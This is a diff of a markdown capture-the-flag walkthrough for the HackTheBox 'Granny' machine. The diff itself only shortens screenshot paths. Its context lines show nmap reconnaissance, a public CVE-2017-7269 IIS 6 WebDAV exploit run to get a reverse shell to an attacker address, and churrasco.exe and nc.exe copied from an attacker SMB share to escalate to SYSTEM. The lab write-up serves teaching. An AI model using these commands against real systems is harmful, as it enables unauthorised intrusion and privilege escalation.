@@ -35,7 +35,7 @@ We begin by checking if the target is alive with ICMP:
 ping -c 1 10.10.10.15
 ```
 
-![](GitHubv2/HackTheBox/EASY/Granny/screenshots/ping.png)
+![](screenshots/ping.png)
 
 The machine responds, confirming it is alive.
 
@@ -48,7 +48,7 @@ We scan all 65,535 TCP ports to identify open services:
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.15 -oG allPorts
 ```
 
-![](GitHubv2/HackTheBox/EASY/Granny/screenshots/allports.png)
+![](screenshots/allports.png)
 
 Extract the open ports:
 
@@ -56,7 +56,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![](GitHubv2/HackTheBox/EASY/Granny/screenshots/extractports.png)
+![](screenshots/extractports.png)
 
 Only port **80/tcp** is open.
 
@@ -73,7 +73,7 @@ nmap -p80 -sC -sV 10.10.10.15 -oN targeted
 cat targeted -l java
 ```
 
-![](GitHubv2/HackTheBox/EASY/Granny/screenshots/targeted.png)
+![](screenshots/targeted.png)
 
 **Findings:**
 
@@ -96,11 +96,11 @@ We clone the exploit:
 git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
 ```
 
-![](GitHubv2/HackTheBox/EASY/Granny/screenshots/exploit.png)
+![](screenshots/exploit.png)
 
 This is a classic **buffer overflow** triggered via the **PROPFIND** WebDAV request:
 
-![](GitHubv2/HackTheBox/EASY/Granny/screenshots/exploit_propfind.png)
+![](screenshots/exploit_propfind.png)
 
 The exploit script requires:
 
@@ -115,7 +115,7 @@ We run the exploit and set up a listener with `nc`:
 python2 iis6\ reverse\ shell 10.10.10.15 80 10.10.14.2 443
 ```
 
-![](GitHubv2/HackTheBox/EASY/Granny/screenshots/exploit_run.png)
+![](screenshots/exploit_run.png)
 
 ✅ Reverse shell obtained.
 
@@ -128,11 +128,11 @@ We check our privileges and system structure:
 
 On Windows Server 2003, user profiles are located in **`Documents and Settings`** instead of `Users`:
 
-![](GitHubv2/HackTheBox/EASY/Granny/screenshots/users.png)
+![](screenshots/users.png)
 
 Checking privileges:
 
-![](GitHubv2/HackTheBox/EASY/Granny/screenshots/priv.png)
+![](screenshots/priv.png)
 
 We have **SeImpersonatePrivilege** enabled, which can be exploited for privilege escalation.
 
@@ -141,7 +141,7 @@ We have **SeImpersonatePrivilege** enabled, which can be exploited for privilege
 
 Normally, **JuicyPotato** would be used, but it does not support Windows Server 2003 due to missing CLSIDs. 
 
-![](GitHubv2/HackTheBox/EASY/Granny/screenshots/JP_clsid.png)
+![](screenshots/JP_clsid.png)
 
 Instead, we use **Churrasco.exe**, a community version adapted for Windows Server 2003.
 
@@ -160,7 +160,7 @@ dir \\10.10.14.2\smbFolder\
 copy \\10.10.14.2\smbFolder\churrasco.exe churrasco.exe
 ```
 
-![](GitHubv2/HackTheBox/EASY/Granny/screenshots/upload_churrasco.png)
+![](screenshots/upload_churrasco.png)
 
 Move to `Temp` directory if copying fails.  
 
@@ -190,7 +190,7 @@ copy "\\10.10.14.2\smb\nc.exe" nc.exe
 
 With SYSTEM access, we can retrieve both flags:
 
-![](GitHubv2/HackTheBox/EASY/Granny/screenshots/root_user_flag.png)
+![](screenshots/root_user_flag.png)
 
 ✅ **User flag obtained**  
 ✅ **Root flag obtained**
